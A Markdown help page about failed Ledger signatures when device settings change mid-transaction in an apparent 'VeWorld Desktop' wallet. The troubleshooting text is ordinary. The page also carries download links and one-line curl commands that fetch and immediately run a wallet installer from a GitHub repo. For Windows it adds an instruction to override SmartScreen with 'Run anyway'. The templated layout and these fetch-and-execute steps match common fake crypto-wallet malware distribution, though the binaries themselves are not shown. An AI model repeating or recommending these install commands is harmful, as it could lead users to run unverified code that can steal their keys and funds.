![VeWorld Desktop](../assets/banner-article.png)

# VeChain Ledger App Settings Mid-Signing in VeWorld Desktop

A changed setting breaks a payload already built

## Downloads - v2.2.4

<p align="center"><a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe"><img src="../assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg"><img src="../assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip"><img src="../assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="../assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`VeWorld-desktop-wallet-win-v2.2.4.exe`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe) |
| <img src="../assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`VeWorld-desktop-wallet-macos-v2.2.4.dmg`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg) |
| <img src="../assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`VeWorld-desktop-wallet-linux-v2.2.4.zip`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip) |

Download the [current VeWorld Desktop release](https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4) for Windows, macOS and Linux.

> Every signature is approved on the device screen, so read it there rather than in the app window.

In VeWorld Desktop, a Ledger setting changed while a transaction is being signed is not picked up by the open flow, and the signature fails. The reliable fix is to close the flow, change the setting on the device, then start the transaction again so the wallet reads the device's current state before building it.

<!-- ARTICLE-BODY-BEGIN -->

## You'll see this if

You started a send, realised a device setting was wrong, changed it on the <a href="https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/pair-a-vechain-ledger-with-veworld-desktop.md">Ledger device</a>, and the confirmation then refused or returned an error. Or the device displayed one thing while the wallet expected another, and the prompt expired before you finished.

| What you did | What the wallet saw | What happens |
|---|---|---|
| Opened a send, then changed a device setting | A snapshot from before the change | Signature refused or stalled |
| Changed contract-data setting mid-flow | Old expectation of the payload | Device shows a different prompt |
| Locked and unlocked the device | Session ended | Flow times out and needs restarting |
| Switched coin apps mid-flow | Device no longer answering | Request never completes |

## Why it happens

A signing flow is a conversation with a fixed script. The wallet builds a transaction, sends it to the device, and waits for a signature over exactly those bytes. The device applies its own settings when it renders and signs. If a setting changes between build and sign, the two sides disagree about what is being signed, and the safe outcome is refusal.

That refusal is a feature. A device that silently signed something different from what the wallet built would be a device you could not audit. Refusing means the mismatch is visible instead of silent, even though from the user's side it looks like a fault.

Timeouts do the rest. A device prompt waits for a physical confirmation and gives up after a while, and any state change during that window - a lock, an app switch, a settings edit - ends the session. When the wallet notices, it reports a failure without knowing why the session ended.

The practical consequence is a rule rather than a workaround: settings are part of the transaction's context, so they belong before the flow starts. Changing them mid-signing cannot be made seamless by retrying inside the same flow, because the flow has already committed to a payload.

## Fix

1. Cancel the current transaction rather than pressing confirm again.
2. Unlock the device and open the VeChain app.
3. Change the setting you need on the device itself, and confirm it took effect.
4. Return to the wallet and start the transaction from the beginning, so a fresh payload is built.
5. Compare the destination and amount on the device screen with what you intended before approving.
6. Complete the signature in one pass, without touching the device's settings during the prompt.

## If that did not work

If the signature still fails after restarting, check that the coin app on the device is the one the wallet expects and that the account selected in the wallet belongs to the connected device.

If the device shows a prompt the wallet never acknowledges, the request may have been built before the account changed. Restart the flow once more, and avoid switching accounts while a prompt is open.

If failures continue across restarts, reinstall the coin app on the device, which clears a corrupted app state without touching the keys.

## Prevention

- Decide device settings before starting a transaction, not during one.
- Keep the device unlocked and on the VeChain app for the whole flow.
- Avoid switching accounts or devices while a prompt is open.
- Never enter the <a href="https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/forgot-vechain-wallet-password-in-veworld-desktop.md">recovery phrase</a> anywhere except the device's own restore flow; settings changes never require it.

VeWorld Desktop is actively maintained, and the current release can be downloaded from the <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4">VeWorld Desktop releases page</a>.

## FAQ

### Why did changing a setting break the signature?

Because the wallet had already built a transaction against the previous state. The device then disagreed with the payload, and refusing was the safe response.

### Can I just retry the confirmation?

No. The flow holds a stale snapshot, so the same mismatch returns. Cancel and start again from the wallet.

### Does the device remember my settings?

Yes, settings live on the device. What does not update is a wallet flow that is already open when you change them.

### Is a failed signature dangerous?

No. A refused signature produces no transaction. The risk would be a silent signature of something unexpected, which is exactly what the refusal prevents.

### Why does the prompt time out so quickly?

Because it waits for a physical confirmation within a bounded window. Locking the device, switching apps or editing settings during that window ends the session.

### Does this happen with software wallets?

There is no device session to lose, so the failure looks different. The equivalent is a stale balance or a fee estimate built before an earlier transaction settled.

### Can I change a setting and carry on with the same prompt?

No. The prompt belongs to a payload that was built against the previous state, so the mismatch persists until the flow is restarted from the wallet.

### Why does the device show a different amount than the app?

Because the two are reading different states: the app built the transaction, and the device renders what it is asked to sign. When they disagree, the device is the authority on what would be signed.

### Does the wallet remember the setting for next time?

The setting lives on the device, so it persists there. What does not persist is an open flow, which is why the next transaction picks it up and the current one does not.

<!-- ARTICLE-BODY-END -->

## How to install VeWorld Desktop

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe">VeWorld-desktop-wallet-win-v2.2.4.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg">VeWorld-desktop-wallet-macos-v2.2.4.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
<!-- BLOCKED: the Linux release asset is a .zip with no verified extraction or launch facts,
     so no command is generated. The verified manual steps are kept below. -->
Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-linux-v2.2.4.zip">VeWorld-desktop-wallet-linux-v2.2.4.zip</a>.
2. Unzip the archive.
3. Run the application inside it.
<!-- INSTALL-END -->

## Related guides

- [Pairing a Ledger with the desktop wallet](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/pair-a-vechain-ledger-with-veworld-desktop.md)
- [When the device is not detected](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/vechain-ledger-sync-not-detected-veworld-desktop.md)
- [What Ledger Live is for, and what the wallet is for](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/vechain-ledger-live-vs-veworld-desktop.md)
- [What hardware cannot protect against](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/vechain-ledger-wallet-losses-veworld-desktop.md)
- [Using two devices with one wallet](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/two-vechain-ledger-wallets-veworld-desktop.md)